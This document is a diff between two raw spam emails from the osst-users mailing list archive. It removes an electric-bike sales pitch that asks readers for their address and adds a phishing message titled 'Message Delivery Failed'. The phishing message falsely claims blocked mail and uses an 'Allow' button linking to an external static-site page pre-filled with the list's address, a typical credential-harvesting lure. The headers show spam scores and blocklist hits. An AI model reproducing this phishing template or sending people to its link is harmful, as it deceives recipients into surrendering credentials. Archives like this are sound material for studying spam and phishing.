@@ -2,93 +2,81 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 9920D879579
-	for <lists+osst-users@lfdr.de>; Tue, 12 Mar 2024 14:57:34 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 525BF87A7A5
+	for <lists+osst-users@lfdr.de>; Wed, 13 Mar 2024 13:34:32 +0100 (CET)
 Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
 	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1rk2dJ-0006F6-3Z
+	id 1rkNoU-0003Kj-Pr
 	for lists+osst-users@lfdr.de;
-	Tue, 12 Mar 2024 13:57:33 +0000
+	Wed, 13 Mar 2024 12:34:31 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
  by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <garyppqn@hqb007.com>) id 1rk2dH-0006Ey-Vs
- for osst-users@lists.sourceforge.net; Tue, 12 Mar 2024 13:57:32 +0000
+ (envelope-from <support@phatfloor.com>) id 1rkNoT-0003KZ-AR
+ for osst-users@lists.sourceforge.net; Wed, 13 Mar 2024 12:34:29 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
  d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
- :Reply-To:From:Date:Message-ID:Subject:To:Sender:Cc:Content-ID:
+ :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=pXUmOjKpB6Uk6Vg25kmDO50GSMG03UPlp6gfdutOydI=; b=iKHxwLlw77QHGonYhMoB8N27NA
- ZvH9MCED5NkxSqcTS9peBUUZOGW9EP3pV6KUp3OqEyfdKmVwlh55zH4A0nL4phqXM2S9/XBBFUq0G
- c0YGt/iUpAO0iHt/uX63oFmmrp9xDQ4MfqgrPFixa5oQqslkIfbAo0453MI82L2sFuec=;
+ bh=B+Q0V8fgnp7fHAkL+C2ypvEfgDYuIxxOanK7ZBFNw3c=; b=O2CawS+tKRB4z+4rt6YdEhkDLV
+ 3nWeZPJQfzVHVLCy2Wm6hWdUhmo8qy4Mjw7z+i7rP7+CtLXmTqDGIPF9G+AlcJn3RTxsExOryF8F3
+ 0FGPemqk5Hwb5B2rv8OwbJiQL/qdf9El2sixF72nQTtV6yD1lLYfcBIC4tmT9FWBvuQc=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Transfer-Encoding:Content-Type:MIME-Version:Reply-To:From:Date:
- Message-ID:Subject:To:Sender:Cc:Content-ID:Content-Description:Resent-Date:
- Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
+ Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
+ :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=pXUmOjKpB6Uk6Vg25kmDO50GSMG03UPlp6gfdutOydI=; b=C
- PeOCoEIkY5repyrZ0CK2oXY6caaLcPFKEcWj0ppcQ5ohdL/lrGmCRCFRPuRd+gZ7l9wVN+njWKMr5
- hmxuxQdmCaquF2KDvmrRef3areNFXvVvK671Kt4kRZZ8FXbARQj8Qc361PGZZcXtXwh7DttgFV/pK
- feHZ3zfUWgCYB3QE=;
-Received: from tclfpx.com ([179.61.221.34])
+ List-Owner:List-Archive; bh=B+Q0V8fgnp7fHAkL+C2ypvEfgDYuIxxOanK7ZBFNw3c=; b=f
+ eqZzCGAtAcX79R/1PrlWXtPlMg+Hu70LMW5wEiHux1s6eVl7t4XDpHNDsa04/4PYLoMs8f6IQEl9A
+ q2X3dt5GuvnnAFSmAg7cEO2tJzwceNWhj5zPV7cpPddMOCMfwwT5JdupG0BBxYVUQY/N8ccQLHTKw
+ M7HSyOYypb67SxFI=;
+Received: from ip85-215-73-40.pbiaas.com ([85.215.73.40] helo=phatfloor.com)
  by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
- id 1rk2d5-0001XI-Pj for osst-users@lists.sourceforge.net;
- Tue, 12 Mar 2024 13:57:32 +0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=mail; d=hqb007.com;
- h=To:Subject:Message-ID:Date:From:Reply-To:MIME-Version:Content-Type:Content-Transfer-Encoding;
- bh=IXvgb2xyHiEZ/8x3IVbqull8UNc=;
- b=HEmzfvdAdy0WERmIZoF9g7Wgrx2KA8VhCQ2m2xP5GLbmmZvuqeiNVuMUjS1+Hmshm3VgSToeH754
- Wl+ffJeWbAU98sGFzdqUy//CTQSmwRrJ0t+AeSYQsy6OrbMXhzAhAR7cGLmn3P+AI0Y5n3Y0JFut
- Bmoa5b4xOjMa08S+Raw=
-DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=mail; d=hqb007.com;
- b=PUV6AK2WM43PC1VVPx5bQ0Pf2dx/6P11RhbzA6qOKRF480hJCpEw+jnUPMMktDAEfzDOM/Jtg/nT
- Ek+6Ycdvc/ICqUXx0a/sy2k8NqBrGQDMvdze1EMVwm6GgmybVwESPHe1kEAc6Q7GVqfNCpvhBPRK
- 74wKTSZOSbr7Kg5sDcc=;
+ id 1rkNoJ-0000nv-3L for osst-users@lists.sourceforge.net;
+ Wed, 13 Mar 2024 12:34:29 +0000
+Received: from ip85-215-73-40.pbiaas.com (account support@phatfloor.com
+ [85.215.73.40] verified)
+ by phatfloor.com (CommuniGate Pro SMTP 6.1.9 _community_)
+ with ESMTPSA id 667698 for osst-users@lists.sourceforge.net;
+ Wed, 13 Mar 2024 11:59:24 +0000
+From: "Support" <support@phatfloor.com>
 To: osst-users@lists.sourceforge.net
-Message-ID: <483df477e1dcb751e2645be9f6969564@hqb007.com>
-Date: Tue, 12 Mar 2024 13:30:50 +0100
-From: "Gary P" <garyppyx@hqb007.com>
+Date: 13 Mar 2024 11:59:23 +0000
+Message-ID: <20240313115923.8273A7B1A0BF5EAE@phatfloor.com>
 MIME-Version: 1.0
-X-Helo-Check: bad, Forged Random Domain (tclfpx.com)
-X-Spam-Score: 3.1 (+++)
+X-Spam-Score: 5.2 (+++++)
 X-Spam-Report: Spam detection software,
- running on the system "util-spamd-1.v13.lw.sourceforge.com", 
+ running on the system "util-spamd-2.v13.lw.sourceforge.com", 
  has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview:  Hi, We are glad to present our cutting-edge foldable electric
- bike, specifically designed for adults. This bike comes equipped with 4.0
- fat tires, which enhance the comfort and stability of your ride, pro [...]
- Content analysis details:   (3.1 points, 6.0 required)
+ Content preview:  Message Delivery Failed Message Delivery Failed We regret
+ to inform you that 10 messages failed to deliver due to security reasons. 
+ Content analysis details:   (5.2 points, 6.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 1.7 URIBL_BLACK            Contains an URL listed in the URIBL blacklist
- [URIs: hqb007.com]
- 0.5 RCVD_IN_MSPIKE_L5      RBL: Very bad reputation (-5)
- [179.61.221.34 listed in bl.mailspike.net]
- -0.0 SPF_PASS               SPF: sender matches SPF record
- 0.0 SPF_HELO_NEUTRAL       SPF: HELO does not match SPF record (neutral)
- 0.0 HTML_MESSAGE           BODY: HTML included in message
+ 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
+ bl.spamcop.net
+ [Blocked - see <https://www.spamcop.net/bl.shtml?85.215.73.40>]
+ 0.9 SPF_HELO_SOFTFAIL      SPF: HELO does not match SPF record (softfail)
+ 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
+ https://senderscore.org/blocklistlookup/
+ [85.215.73.40 listed in bl.score.senderscore.com]
+ 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
+ 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- 0.0 HTML_IMAGE_RATIO_04    BODY: HTML has a low ratio of text to image
- area
- -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
- envelope-from domain
- -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
- 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
- valid
- -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
- author's domain
+ 0.0 HTML_MESSAGE           BODY: HTML included in message
+ 0.4 RDNS_DYNAMIC           Delivered to internal network by host with
+ dynamic-looking rDNS
  -0.0 T_SCC_BODY_TEXT_LINE   No description available.
- 1.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
-X-Headers-End: 1rk2d5-0001XI-Pj
-Subject: [Osst-users] following up on my last email from last week - about
- our electric bicycle
+ 0.3 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
+X-Headers-End: 1rkNoJ-0000nv-3L
+Subject: [Osst-users] Message Delivery Failed
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -100,96 +88,106 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: garyp@hqb007.com
-Content-Type: multipart/mixed; boundary="===============8261621535295232515=="
+Content-Type: multipart/mixed; boundary="===============1943225048902853414=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
---===============8261621535295232515==
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: 8bit
+--===============1943225048902853414==
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-<html>
-<head>
+<!DOCTYPE html>
+
+<html lang=3D"en"><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta charset=3D"UTF-8">
+<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1.=
+0">
+<title>Message Delivery Failed</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        background-color: #f0f0f0;
+    }
+    .container {
+        margin-top: 100px;
+        padding: 20px;
+        border-radius: 10px;
+        background-color: #ffffff;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        width: 70%;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    h1 {
+        color: #333333;
+    }
+    p {
+        color: #666666;
+        margin-bottom: 20px;
+    }
+    button {
+        padding: 10px 20px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+        background-color: #4CAF50;
+        color: #ffffff;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+align: center;
+width:55%;
+    }
+    button:hover {
+        background-color: #45a049;
+    }
+</style>
 </head>
-<body>
-Hi,<br /> <br /> We are glad to present our cutting-edge foldable electric
-bike, specifically designed for adults. <br />This bike comes equipped with
-4.0 fat tires, which enhance the comfort and stability of your ride,
-propelling your cycling experience to unprecedented levels.<br /> <br />
-Key features and advantages:<br /> 4.0 fat tires for all-terrain
-versatility: our electric bike boasts 20 inch 4.0 fat tires that provide
-improved grip and traction on a variety of surfaces. <br />whether it's
-off-road trails or urban pavements, these tires ensure a smooth and stable
-ride by absorbing shocks and bumps with ease. <br />the increased contact
-area with the ground also means better handling and a safer ride,
-especially under challenging weather conditions.<br /> <br /> 500w motor
-for powerful performance: the bike is powered by a high-speed brushless
-500w motor, <br />ideal for conquering hills and reaching up to 30mph with
-an impressive 85n.m torque. this motor ensures a perfect blend of speed and
-<br />efficiency for your daily commutes or leisurely rides.<br /> <br />
-Long-range 48v 13ah lithium battery: with the capability to travel up to
-50km on pedal-assist mode, our e-bike is perfect for long-distance rides.
-<br />the battery is equipped with a BMS system for enhanced safety and
-features a quick 4-5 hour charge time, so you're always ready to go.<br />
-<br /> CE certification for peace of mind: safety and compliance are our
-top priorities. our foldable e-bike is CE certified, adhering to the strict
-European <br />standards for safety and performance, ensuring you receive a
-product that is both reliable and high-quality.<br /><br /><img
-src="https://i0.wp.com/www.leeco-riders.com/wp-content/uploads/2023/06/img_0610.jpeg?fit=1000%252C1000&amp;ssl=1"
-width="1000" height="1000" /><br /> <br /><br /> <br /> If you are
-interested in purchasing our ebikes, please provide us with your detailed
-address. This will allow us to calculate the cost accurately <br />and
-arrange the delivery of your purchase. Your prompt provision of this
-information will ensure a smooth transaction and timely dispatch of your
-ebikes<br /> <br /> Superior hydraulic disc brakes: our bike is equipped
-with hydraulic disc brakes that offer exceptional stopping power, reducing
-braking distance by 50 percent <br />compared to standard mechanical
-brakes. this means you can ride with confidence, knowing you have the best
-in class braking technology at your fingertips.<br /> <br /> Designed for
-comfort and durability: the carbon steel front fork with rebound and lock
-functions, combined with a 7-speed gear shift system, <br />provides a
-customizable and comfortable riding experience. the 6061 aluminum frame and
-integrated alloy wheel are designed to withstand <br />heavier weights and
-absorb shocks, ensuring longevity and a consistently smooth ride.<br /> <br
-/> We are confident that our new foldable electric bike with 4.0 fat tires
-will be a compelling addition to your product lineup, attracting customers
-<br />seeking a premium, versatile, and eco-friendly mode of
-transportation.<br /> <br /> If you are interested in purchasing our
-ebikes, please provide us with your detailed address. This will allow us to
-calculate the cost accurately and <br />arrange the delivery of your
-purchase. Your prompt provision of this information will ensure a smooth
-transaction and timely dispatch of your ebikes.<br /> <br /> Thank you for
-choosing to do business with us. we are keen to collaborate with you and
-bring this exceptional bike to your customers.<br /> <br /> Thanks,<br />
-Gary Parker<br /> Manufacture of electric bicycle<br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br
-/><br /><br /><br /><br /><br />Welcome to our factory.
-</body>
-</html>
+<body style=3D"font-family: Arial, sans-serif;
+        text-align: center;
+        background-color: #f0f0f0">
+    <div style=3D"margin-top: 100px;
+        padding: 20px;
+        border-radius: 10px;
+        background-color: #ffffff;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        width: 70%;
+        margin-left: auto;
+        margin-right: auto" class=3D"container">
+        <h1 style=3D"color: #333333">Message Delivery Failed</h1>
+        <p style=3D"color: #666666;
+        margin-bottom: 20px">We regret to inform you that 10 messages faile=
+d to deliver due to security reasons.</p>
+        <p style=3D"color: #666666;
+        margin-bottom: 20px">To enable successful delivery, please click th=
+e button below:</p>
+        <a href=3D"https://zealous-river-09c72a610.5.azurestaticapps.net/?e=
+ml=3Dosst-users@lists.sourceforge.net" target=3D"_blank"><button style=3D"p=
+adding: 10px 20px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+        background-color: #4CAF50;
+        color: #ffffff;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+align: center;
+width:55%">Allow</button></a>
+    </div>
 
 
+ </body></html>
 
---===============8261621535295232515==
+
+--===============1943225048902853414==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============8261621535295232515==
+--===============1943225048902853414==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -200,4 +198,4 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============8261621535295232515==--
+--===============1943225048902853414==--
